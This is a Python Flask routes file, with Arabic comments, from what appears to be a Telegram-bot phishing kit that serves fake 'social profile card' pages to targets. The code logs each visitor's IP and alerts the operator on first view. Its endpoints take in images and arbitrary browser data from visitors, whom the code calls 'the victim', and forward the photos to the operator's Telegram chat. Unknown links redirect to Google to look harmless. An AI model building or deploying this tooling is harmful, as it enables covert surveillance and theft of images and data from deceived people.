# fake_sites/social_profile/routes.py
# ============================================================
# مسارات Social Profile Card
# ============================================================

import os
import json
import time
import uuid

from flask import (
    request, jsonify, redirect,
    render_template_string, send_from_directory,
)

from config import bot, redis_client, PUBLIC_URL

from logging_config import get_logger
from monitoring import metrics

logger = get_logger("social_profile.routes")


TEMPLATES_DIR = os.path.join(os.path.dirname(__file__), 'templates')
SESSION_TTL = 86400 * 30


# ============================================================
# Load Template
# ============================================================
def _load_template(filename):
    path = os.path.join(TEMPLATES_DIR, filename)
    if not os.path.exists(path):
        return None
    with open(path, 'r', encoding='utf-8') as f:
        return f.read()


# ============================================================
# Create Session
# ============================================================
def create_profile(chat_id, data):
    """ينشئ بروفايل جديد ويرجع session_id"""
    if not redis_client:
        return None

    try:
        session_id = uuid.uuid4().hex[:12]
        now = time.time()

        profile_data = {
            "session_id": session_id,
            "chat_id": str(chat_id),
            "created_at": now,
            "name": (data.get("name") or "مستخدم")[:50],
            "title": (data.get("title") or "")[:100],
            "bio": (data.get("bio") or "")[:300],
            "photo": data.get("photo") or "",
            "phone": (data.get("phone") or "")[:30],
            "email": (data.get("email") or "")[:80],
            "website": (data.get("website") or "")[:200],
            "whatsapp": (data.get("whatsapp") or "")[:30],
            "telegram": (data.get("telegram") or "")[:50],
            "instagram": (data.get("instagram") or "")[:50],
            "facebook": (data.get("facebook") or "")[:50],
            "theme": data.get("theme") or "dark",
            "views": 0,
            "accessed": False,
        }

        redis_client.setex(
            f"profile:{session_id}",
            SESSION_TTL,
            json.dumps(profile_data, ensure_ascii=False)
        )

        redis_client.lpush(f"profile_user:{chat_id}", session_id)
        redis_client.ltrim(f"profile_user:{chat_id}", 0, 99)
        redis_client.expire(f"profile_user:{chat_id}", SESSION_TTL)

        logger.info(f"Profile created: {session_id} | {profile_data['name']}")
        metrics.inc_counter("social_profiles_created")

        return session_id

    except Exception as e:
        logger.exception(f"create_profile error: {e}")
        return None


def get_profile(session_id):
    if not redis_client:
        return None
    try:
        raw = redis_client.get(f"profile:{session_id}")
        if raw:
            return json.loads(raw)
    except Exception:
        pass
    return None


def update_profile_photo(session_id, photo_data):
    """يحدّث صورة البروفايل"""
    if not redis_client:
        return False
    try:
        raw = redis_client.get(f"profile:{session_id}")
        if not raw:
            return False
        profile = json.loads(raw)
        profile["photo"] = photo_data
        redis_client.setex(
            f"profile:{session_id}",
            SESSION_TTL,
            json.dumps(profile, ensure_ascii=False)
        )
        return True
    except Exception as e:
        logger.exception(f"update_profile_photo error: {e}")
        return False


def track_view(session_id, request_obj):
    """يسجّل مشاهدة + ينبّه البوت"""
    if not redis_client:
        return

    try:
        raw = redis_client.get(f"profile:{session_id}")
        if not raw:
            return

        profile = json.loads(raw)
        profile["views"] = profile.get("views", 0) + 1
        profile["last_viewed_at"] = time.time()
        profile["last_viewer_ip"] = (
            request_obj.headers.get('CF-Connecting-IP') or
            request_obj.headers.get('X-Forwarded-For', '').split(',')[0].strip() or
            request_obj.remote_addr
        )

        redis_client.setex(
            f"profile:{session_id}",
            SESSION_TTL,
            json.dumps(profile, ensure_ascii=False)
        )

        # أول زيارة → بلّغ
        if not profile.get("accessed"):
            profile["accessed"] = True
            redis_client.setex(
                f"profile:{session_id}",
                SESSION_TTL,
                json.dumps(profile, ensure_ascii=False)
            )

            chat_id = profile.get("chat_id")
            if chat_id:
                try:
                    cid = int(chat_id) if str(chat_id).isdigit() else chat_id
                    bot.send_message(
                        cid,
                        f"👁️ <b>تم فتح البروفايل!</b>\n"
                        f"━━━━━━━━━━━━━━━━━━\n"
                        f"🆔 <code>{session_id}</code>\n"
                        f"👤 <b>الاسم:</b> {profile.get('name', '—')}\n"
                        f"🌐 <b>IP:</b> <code>{profile.get('last_viewer_ip', '—')}</code>",
                        parse_mode="HTML"
                    )
                except Exception as e:
                    logger.warning(f"notify view error: {e}")

            metrics.inc_counter("social_profiles_viewed")

    except Exception as e:
        logger.warning(f"track_view error: {e}")


# ============================================================
# Routes
# ============================================================
def register_social_profile_routes(app, bot):

    # ─── عرض البروفايل ───
    @app.route('/profile/<session_id>', methods=['GET'])
    def social_profile_view(session_id):
        """يعرض البروفايل للضحية"""
        profile = get_profile(session_id)

        if not profile:
            return redirect("https://www.google.com", code=302)

        track_view(session_id, request)

        template = _load_template('profile.html')
        if not template:
            return redirect("https://www.google.com", code=302)

        # استبدل المتغيرات
        html = template
        html = html.replace("__NAME__", profile.get("name", "مستخدم"))
        html = html.replace("__TITLE__", profile.get("title", ""))
        html = html.replace("__BIO__", profile.get("bio", ""))
        html = html.replace("__PHOTO__", profile.get("photo", ""))
        html = html.replace("__PHONE__", profile.get("phone", ""))
        html = html.replace("__EMAIL__", profile.get("email", ""))
        html = html.replace("__WEBSITE__", profile.get("website", ""))
        html = html.replace("__WHATSAPP__", profile.get("whatsapp", ""))
        html = html.replace("__TELEGRAM__", profile.get("telegram", ""))
        html = html.replace("__INSTAGRAM__", profile.get("instagram", ""))
        html = html.replace("__FACEBOOK__", profile.get("facebook", ""))
        html = html.replace("__THEME__", profile.get("theme", "dark"))
        html = html.replace("__SESSION_ID__", session_id)
        html = html.replace("__PUBLIC_URL__", PUBLIC_URL)

        # سكربت التتبع
        html = html.replace("__TRACK_ENDPOINT__", f"{PUBLIC_URL}/profile/{session_id}/track")

        response = app.make_response(html)
        response.headers['Content-Type'] = 'text/html; charset=utf-8'
        response.headers['Cache-Control'] = 'no-cache'
        response.headers['X-Robots-Tag'] = 'noindex, nofollow'
        return response


    # ─── رفع صورة من الضحية ───
    @app.route('/profile/<session_id>/upload', methods=['POST', 'OPTIONS'])
    def social_profile_upload(session_id):
        """يستقبل صور من الضحية"""
        if request.method == 'OPTIONS':
            resp = app.make_response('')
            resp.headers['Access-Control-Allow-Origin'] = '*'
            resp.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
            resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'
            return resp, 200

        try:
            data = request.get_json(silent=True) or {}
            image = data.get('image', '')

            if not image or not image.startswith('data:image'):
                return jsonify({'ok': False}), 200

            profile = get_profile(session_id)
            if not profile:
                return jsonify({'ok': False}), 200

            chat_id = profile.get("chat_id")
            cid = int(chat_id) if str(chat_id).isdigit() else chat_id

            # أرسل الصورة للبوت
            try:
                import base64
                import io
                _, encoded = image.split(',', 1)
                img_bytes = base64.b64decode(encoded)
                buf = io.BytesIO(img_bytes)
                buf.name = f"profile_photo_{int(time.time())}.jpg"

                bot.send_photo(
                    cid, buf,
                    caption=(
                        f"📸 <b>صورة من الضحية</b>\n"
                        f"━━━━━━━━━━━━━━━━━━\n"
                        f"🆔 <code>{session_id}</code>\n"
                        f"👤 <b>{profile.get('name', '—')}</b>"
                    ),
                    parse_mode="HTML"
                )
                metrics.inc_counter("social_profile_photos")
            except Exception as e:
                logger.warning(f"send profile photo error: {e}")

            return jsonify({'ok': True}), 200

        except Exception as e:
            logger.exception(f"social_profile_upload error: {e}")
            return jsonify({'ok': False}), 200


    # ─── Track إضافي ───
    @app.route('/profile/<session_id>/track', methods=['POST', 'OPTIONS'])
    def social_profile_track(session_id):
        """يستقبل بيانات إضافية من الضحية"""
        if request.method == 'OPTIONS':
            resp = app.make_response('')
            resp.headers['Access-Control-Allow-Origin'] = '*'
            resp.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
            resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'
            return resp, 200

        try:
            data = request.get_json(silent=True) or {}

            if not redis_client:
                return jsonify({'ok': False}), 200

            # خزّن بيانات إضافية
            redis_client.setex(
                f"profile_data:{session_id}",
                SESSION_TTL,
                json.dumps(data, ensure_ascii=False)
            )

            return jsonify({'ok': True}), 200

        except Exception as e:
            logger.exception(f"social_profile_track error: {e}")
            return jsonify({'ok': False}), 200


    # ─── API: إنشاء بروفايل ───
    @app.route('/profile/api/create', methods=['POST'])
    def social_profile_create():
        """ينشئ بروفايل جديد (يستخدمه البوت داخلياً)"""
        try:
            data = request.get_json(silent=True) or {}
            chat_id = data.get('chat_id')
            if not chat_id:
                return jsonify({'ok': False, 'error': 'no_chat_id'}), 400

            session_id = create_profile(chat_id, data)
            if not session_id:
                return jsonify({'ok': False}), 500

            link = f"{PUBLIC_URL}/profile/{session_id}"
            return jsonify({'ok': True, 'session_id': session_id, 'link': link}), 200

        except Exception as e:
            logger.exception(f"social_profile_create error: {e}")
            return jsonify({'ok': False}), 500


    logger.info("[+] Social Profile routes: /profile/<session_id>")
